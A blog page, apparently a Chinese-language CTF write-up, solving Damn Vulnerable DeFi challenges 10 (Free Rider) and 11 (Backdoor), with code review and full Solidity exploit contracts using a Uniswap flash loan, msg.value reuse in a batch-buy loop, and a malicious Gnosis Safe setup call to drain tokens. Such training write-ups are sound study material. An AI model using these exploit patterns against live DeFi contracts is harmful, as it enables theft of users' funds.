@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="Thomas_Xu&#39;s Bolg">
+    <meta name="keyword"  content="Thomas_Xu, BlockChain">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          Damn Defi 题解 10-11 - Thomas_Xu
+        
+    </title>
+
+    <link rel="canonical" href="https://dusign.net/DamnDefi-10-11/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('page1.png')
+                /*post*/
+            
+        
+    }
+    
+    #signature{
+        background-image: url('/img/signature/dusign.png');
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#Damn Defi" title="Damn Defi">Damn Defi</a>
+                            
+                        </div>
+                        <h1>Damn Defi 题解 10-11</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by Thomas_Xu on
+                            2022-10-10
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">2k</span> and
+                                Reading Time <span class="post-count">9</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Thomas_Xu&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="Damn-Defi靶场刷题记录-10-11"><a href="#Damn-Defi靶场刷题记录-10-11" class="headerlink" title="Damn Defi靶场刷题记录(10-11)"></a>Damn Defi靶场刷题记录(10-11)</h1><pre><code>author: Thomas_Xu
+</code></pre><h2 id="10-Free-rider"><a href="#10-Free-rider" class="headerlink" title="10 Free rider"></a>10 Free rider</h2><p>这又是一道利用闪电贷来获取利益的题目。可见Defi平台要预防可能的闪电攻击是个难题。</p>
+<p>题目要求我们偷走买家的的45个ETH，并且还要市场失去一些比特币。</p>
+<h3 id="Code-Review"><a href="#Code-Review" class="headerlink" title="Code Review"></a><strong>Code Review</strong></h3><p>首先我们从头来看这个Challenge</p>
+<ul>
+<li><p><strong>FreeRiderNFTMarketplace</strong><br>这是交易市场的合约,主要的功能就是商品的上架，买入等功能。</p>
+<ul>
+<li>offerMany(uint256[] calldata tokenIds, uint256[] calldata prices)<blockquote>
+<p>这是一个根据NFTid定价的函数，传入的参数分别是NFT的id数组和价格数组。</p>
+</blockquote>
+</li>
+<li>buyMany(uint256[] calldata tokenIds) external payable<blockquote>
+<p>这是购买指定id的NFT的函数。入参即NFT的id数组。<br>在阅读市场合约后，我产生一个疑惑”题目中要求市场合约损失一些ETH是怎么回事”，于是我立即又倒回去再次审查，看到<code>_buyOne</code>的时候立即让我警觉起来<br><img src="Damn10_1.png" alt=""><br>这里通过msg.value来检查发送的金额是否足够买下此NFT，看似没有问题，但是！<code>buyMany()</code>函数通过循环来调用了这个<code>_buyMany()</code>子函数，这样一组合，就导致这一流程出现重入的风险，我们只要一次调用<code>buyMany()</code>，那么在每次循环，我们的<code>msg.value</code>并不会发生变化。这意味着我们可以用一笔很少的钱买下市场上所有单价低于此金额的NFT。<br>这就是市场ETH减少的秘密！</p>
+</blockquote>
+</li>
+</ul>
+</li>
+<li><p><strong>Exploit</strong><br>我们再来理一理思路，我们要做的是：</p>
+<blockquote>
+<p>1.先通过闪电贷借30ETH通过正规途径买入两个NFT<br>2.将买入的两个NFT以90ETH/个的价格出售<br>3.再通过闪电贷获得90ETH后，自己当买家，通过重入漏洞以90一个的价格买入两个NFT(消耗市场的余额)<br>4.还给闪电贷120个ETH后，自己赚取60个ETH正好可以买4余下的4个NFT</p>
+</blockquote>
+</li>
+</ul>
+<p>以此写出攻击合约：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;.&#x2F;FreeRiderBuyer.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;FreeRiderNFTMarketplace.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC721&#x2F;IERC721Receiver.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableNFT.sol&quot;;</span><br><span class="line">import &quot;hardhat&#x2F;console.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Callee &#123;</span><br><span class="line">    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IWETH &#123;</span><br><span class="line">    function transfer(address recipient, uint256 amount) external returns (bool);</span><br><span class="line">    function deposit() external payable;</span><br><span class="line">    function withdraw(uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IUniswapV2Pair &#123;</span><br><span class="line">    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IFreeRiderNFTMarketplace &#123;</span><br><span class="line">    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;</span><br><span class="line">    function buyMany(uint256[] calldata tokenIds) external payable;</span><br><span class="line">    function token() external returns (IERC721);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract FreeRiderExploit is IUniswapV2Callee, IERC721Receiver &#123;</span><br><span class="line"></span><br><span class="line">address public attcker;</span><br><span class="line">address immutable buyer;</span><br><span class="line">IFreeRiderNFTMarketplace immutable market;</span><br><span class="line">IUniswapV2Pair immutable uniswapPair;</span><br><span class="line">IWETH immutable weth;</span><br><span class="line">IERC721 immutable nft;</span><br><span class="line"></span><br><span class="line">    constructor(address _Buyer, IFreeRiderNFTMarketplace _market, IWETH _token, IUniswapV2Pair _uniswapPair)&#123;</span><br><span class="line">        market &#x3D; _market;</span><br><span class="line">        buyer &#x3D; _Buyer;</span><br><span class="line">        attcker &#x3D; msg.sender;</span><br><span class="line">        uniswapPair &#x3D; _uniswapPair;</span><br><span class="line">        nft &#x3D; _market.token();</span><br><span class="line">        weth &#x3D; _token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        uniswapPair.swap(</span><br><span class="line">            120 ether,         &#x2F;&#x2F;根据分析，我们一共需要从闪电贷借120ETH</span><br><span class="line">            0 ,                &#x2F;&#x2F;我们不关心这个参数，因为我们只用借ETH</span><br><span class="line">            address(this),     &#x2F;&#x2F;借款发送到此合约</span><br><span class="line">            hex&quot;00&quot;            &#x2F;&#x2F;为了使data不为空（我们不关心此参数）</span><br><span class="line">        );           </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;闪电贷回调函数</span><br><span class="line">    function uniswapV2Call(address, uint, uint, bytes calldata) external override &#123;</span><br><span class="line">        console.log(&quot;success in line&quot;, 62);</span><br><span class="line">        &#x2F;&#x2F;通过闪电借的120 ether先提款到此合约</span><br><span class="line">        weth.withdraw(120 ether);</span><br><span class="line">        console.log(&quot;success in line&quot;, 65);</span><br><span class="line">        &#x2F;&#x2F;先买两个NFT</span><br><span class="line">        uint256[] memory tokenids1 &#x3D; new uint256[](2);</span><br><span class="line">        tokenids1[0] &#x3D; 0;</span><br><span class="line">        tokenids1[1] &#x3D; 1;</span><br><span class="line">        market.buyMany&#123;value: 30 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;以90的价格放入市场</span><br><span class="line">        nft.setApprovalForAll(address(market), true);</span><br><span class="line">        uint256[] memory price1 &#x3D; new uint256[](2);</span><br><span class="line">        price1[0] &#x3D; 90 ether;</span><br><span class="line">        price1[1] &#x3D; 90 ether;</span><br><span class="line">        market.offerMany(tokenids1, price1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;利用重入漏洞以90ether的价格买下这两个NFT</span><br><span class="line">        market.buyMany&#123;value:90 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;还款</span><br><span class="line">        uint256 fee &#x3D; ((120 ether * 3) &#x2F; uint256(997)) + 1;</span><br><span class="line">        weth.deposit&#123;value: 120 ether + fee&#125;();</span><br><span class="line">        weth.transfer(address(uniswapPair), 120 ether + fee);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;用60ETH买4个NFT</span><br><span class="line">        tokenids1 &#x3D; new uint256[](4);</span><br><span class="line">        tokenids1[0] &#x3D; 2;</span><br><span class="line">        tokenids1[1] &#x3D; 3;</span><br><span class="line">        tokenids1[2] &#x3D; 4;</span><br><span class="line">        tokenids1[3] &#x3D; 5;</span><br><span class="line">        market.buyMany&#123;value:60 ether&#125;(tokenids1);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;把六个nft都给buyer</span><br><span class="line">        for(uint8 tokenId &#x3D; 0; tokenId &lt; 6; tokenId++)&#123;</span><br><span class="line">            nft.safeTransferFrom(address(this), buyer, tokenId);</span><br><span class="line">        &#125;</span><br><span class="line">     </span><br><span class="line">        &#x2F;&#x2F;</span><br><span class="line">        payable(address(attcker)).transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) &#123;</span><br><span class="line">        return IERC721Receiver.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>总结：在合约中重用相同的内容（通常通过循环或某种批处理/多调用函数）是一个非常重要的漏洞。</li>
+</ul>
+<h2 id="11-Backdoor"><a href="#11-Backdoor" class="headerlink" title="11 Backdoor"></a>11 Backdoor</h2><p>这个题我花费了大量的时间！因为需要对<code>GnosisSafe</code>Wallet的源码足够了解。在做这个挑战的时候又不停的在学习有关操作码的东西，这很麻烦。我必须说这个题是我目前做到的挑战里面比较折磨我的。<br>这个挑战的背景是<a href="https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol" target="_blank" rel="noopener">Gnosis安全钱包</a>,有人部署了钱包的注册表，当此团队中的人部署钱包时，他们将获得10个token，我们要做的就是拿到着40个token</p>
+<h3 id="Code-Review-1"><a href="#Code-Review-1" class="headerlink" title="Code Review"></a><strong>Code Review</strong></h3><p>这个挑战只有一个注册表合约，但往往看似简单的东西都挺难的。</p>
+<ul>
+<li><strong>WalletRegistry</strong><br>注册表合约<ul>
+<li>addBeneficiary()<br>添加受益人到注册表的函数,beneficiaries[]就是检测是否为注册表里有的地址</li>
+<li>_removeBeneficiary()<br>在受益人收益后从注册表删除此受益人</li>
+<li><strong>proxyCreated</strong><br>通过注释我们可以知道这是创建钱包时会调用的一个回调函数，而这个函数的作用就是给注册表中的受益人那10个token。</li>
+</ul>
+</li>
+</ul>
+<p>看起来，重头戏并不在这里，于是我把目光投向了<code>GnosisSafe</code>钱包的源码</p>
+<ul>
+<li><p><strong>GnosisSafe源码</strong><br>首先我们全局搜索回调<code>proxyCreated</code>的的地方，只有一个<code>createProxyWithCallback()</code>函数</p>
+<ul>
+<li><strong>GnosisSafeProxyFactory</strong> -createProxyWithCallback<br><img src="Damn10_CallBack.png" alt=""><br>入参有四个：<ol>
+<li>address _singleton<br>这是一个单例地址</li>
+<li>bytes memory initializer<br>这是初始化器的字节码，初始化函数其实就是<code>GnosisSafe</code>里的<code>setup()</code>函数</li>
+<li>uint256 saltNonce<br>这是Create2里的随机数，我们不用关心</li>
+<li>IProxyCreationCallback callback<br>这是回调合约的地址<br>我们直接关注回调的地方，<code>callback.proxyCreated(proxy, _singleton, initializer, saltNonce);</code>这里只是简单的一个回调，参数看上去也没有什么漏洞。<br>然后就是在上一行调用了<code>createProxyWithNonce</code>函数</li>
+</ol>
+</li>
+<li><p><strong>GnosisSafeProxyFactory</strong> -createProxyWithNonce<br>这个函数内主要其实就是对initializer初始化函数的调用，只不过是用汇编实现的。<br>看起来关键可能在于<code>setup</code>函数</p>
+</li>
+<li><p><strong>GnosisSafe</strong> -setup<br>这是Gnosis钱包的一个初始化函数，我一眼就看到了<code>setupModules(to, data);</code>这明显是一个外部调用，这给我了一点希望。再仔细一看这里的参数确实是可以导致借入的。我们可以借此让钱包approve给我们所有的token，我们只需要把这个token转出来即可。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>Exploit</strong><br>总结一下以上的分析，其实这个题就是利用了一个gnosis钱包的一个外部调用，再钱包的上下文中执行<code>approve</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;GnosisSafeProxy.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;GnosisSafeProxyFactory.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;proxies&#x2F;IProxyCreationCallback.sol&quot;;</span><br><span class="line">import &quot;@gnosis.pm&#x2F;safe-contracts&#x2F;contracts&#x2F;GnosisSafe.sol&quot;;</span><br><span class="line">import &quot;..&#x2F;DamnValuableToken.sol&quot;;</span><br><span class="line">import &quot;hardhat&#x2F;console.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IGnosisSafe &#123;</span><br><span class="line">     function setup(</span><br><span class="line">        address[] calldata _owners,</span><br><span class="line">        uint256 _threshold,</span><br><span class="line">        address to,</span><br><span class="line">        bytes calldata data,</span><br><span class="line">        address fallbackHandler,</span><br><span class="line">        address paymentToken,</span><br><span class="line">        uint256 payment,</span><br><span class="line">        address payable paymentReceiver</span><br><span class="line">    ) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract BackdoorExploit &#123;</span><br><span class="line"></span><br><span class="line">    DamnValuableToken immutable token;</span><br><span class="line">    GnosisSafeProxyFactory immutable gnosisFactory;</span><br><span class="line">    address registryAddress;</span><br><span class="line">    address masterCopyAddress;</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _registryAddress,</span><br><span class="line">        address _masterCopyAddress,</span><br><span class="line">        address _walletFactory,</span><br><span class="line">        address _token</span><br><span class="line">    )&#123;</span><br><span class="line">        token &#x3D; DamnValuableToken(_token);</span><br><span class="line">        gnosisFactory &#x3D; GnosisSafeProxyFactory(_walletFactory);</span><br><span class="line">        registryAddress &#x3D; _registryAddress;</span><br><span class="line">        masterCopyAddress &#x3D; _masterCopyAddress;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function GiveApprove(address _token, address _spender) external &#123;</span><br><span class="line">        DamnValuableToken(_token).approve(_spender, 10 * 10**18);</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The spender&#39;s address :&quot;, _spender);</span><br><span class="line">        console.log(&quot;The Giver&#39;s address:&quot;, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function creatWallet(address[] memory victims)external returns (address newproxy)&#123;</span><br><span class="line">        address[] memory owner &#x3D; new address[](1);</span><br><span class="line">        for(uint8 i &#x3D; 0; i &lt; victims.length; i++)&#123;</span><br><span class="line">            owner[0] &#x3D; victims[i];</span><br><span class="line">            bytes memory init &#x3D; abi.encodeWithSelector(</span><br><span class="line">                GnosisSafe.setup.selector, </span><br><span class="line">                owner,                                      &#x2F;&#x2F;新建钱包的owner</span><br><span class="line">                1,                                          &#x2F;&#x2F;threshold 只能为1</span><br><span class="line">                address(this),                              &#x2F;&#x2F;漏洞出现点</span><br><span class="line">                abi.encodeWithSelector(                     &#x2F;&#x2F;借入</span><br><span class="line">                    BackdoorExploit.GiveApprove.selector, </span><br><span class="line">                    address(token),</span><br><span class="line">                    address(this)</span><br><span class="line">                ),</span><br><span class="line">                address(0x0),</span><br><span class="line">                address(0x0),</span><br><span class="line">                0,</span><br><span class="line">                address(0x0)</span><br><span class="line">                );</span><br><span class="line"></span><br><span class="line">        GnosisSafeProxy proxy &#x3D;  gnosisFactory.createProxyWithCallback(</span><br><span class="line">            masterCopyAddress,</span><br><span class="line">            init,</span><br><span class="line">            i,</span><br><span class="line">            IProxyCreationCallback(registryAddress)</span><br><span class="line">        );</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The msg.sender&#39;s address:&quot;, msg.sender);</span><br><span class="line">        console.log(&quot;The proxy&#39;s address:&quot;, address(proxy));</span><br><span class="line">        &#x2F;&#x2F; console.log(&quot;The this address:&quot;, address(this));</span><br><span class="line">        DamnValuableToken(token).transferFrom(address(proxy), msg.sender, 10 *10**18);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/uniswap-v3/" data-toggle="tooltip" data-placement="top" title="Uniswap_V3 源码分析">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/DamnDefi-08-09/" data-toggle="tooltip" data-placement="top" title="Damn Defi 题解 8-9">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+                <div class="comment_notes_blank"></div>
+                <div class="visitor_notice">
+                    <img 
+                        src="/img/notice.png" 
+                        alt="notice"
+                        title="notice"/>
+                    <p class="notice">
+                        true
+                    </p>
+                </div>
+                
+
+                
+                <div class="comment_notes">
+                    <p>
+                        This is copyright.
+                    </p>
+                </div>
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                
+<link rel="stylesheet" href="/css/music-player/fonts/iconfont.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/reset.css">
+
+
+<link rel="stylesheet" href="/css/music-player/css/player.css">
+
+
+<div class="music-player">
+    <audio class="music-player__audio" ></audio>
+    <div class="music-player__main">
+        <div class="music-player__blur"></div>
+        <div class="music-player__disc">
+            <div class="music-player__image">
+                <img width="100%" src="" alt="">
+            </div>
+            <div class="music-player__pointer"><img width="100%" src="/img/cd_tou.png" alt=""></div>
+        </div>
+        <div class="music-player__controls">
+            <div class="music__info">
+                <h3 class="music__info--title">...</h3>
+                <p class="music__info--singer">...</p>
+            </div>
+            <div class="player-control">
+                <div class="player-control__content">
+                    <div class="player-control__btns">
+                        <div class="player-control__btn player-control__btn--prev"><i class="iconfont icon-prev"></i></div>
+                        <div class="player-control__btn player-control__btn--play"><i class="iconfont icon-play"></i></div>
+                        <div class="player-control__btn player-control__btn--next"><i class="iconfont icon-next"></i></div>
+                        <div class="player-control__btn player-control__btn--mode"><i class="iconfont icon-loop"></i></div>
+                    </div>
+                    <div class="player-control__volume">
+                        <div class="control__volume--icon player-control__btn"><i class="iconfont icon-volume"></i></div>
+                        <div class="control__volume--progress player_progress"></div>
+                    </div>
+                </div>
+                <div class="player-control__content">
+                    <div class="player__song--progress player_progress"></div>
+                    <div class="player__song--timeProgess nowTime">00:00</div>
+                    <div class="player__song--timeProgess totalTime">00:00</div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<script src="/js/music-player/utill.js"></script>
+
+
+<script src="/js/music-player/jquery.min.js"></script>
+
+<!-- netease; qqkg -->
+<!--
+<script src="/js/music-player/player.js?library=config.music.library.js"></script>
+-->
+<script src="../../../../js/music-player/player.js?library=netease&music=https://kg.qq.com/node/play?s=7deFpz7Z26Jmv7di&g_f=share_html"></script>
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+    
+      
+        <aside id="sidebar">
+          <div id="toc" class="toc-article">
+          <strong class="toc-title">Contents</strong>
+          
+            
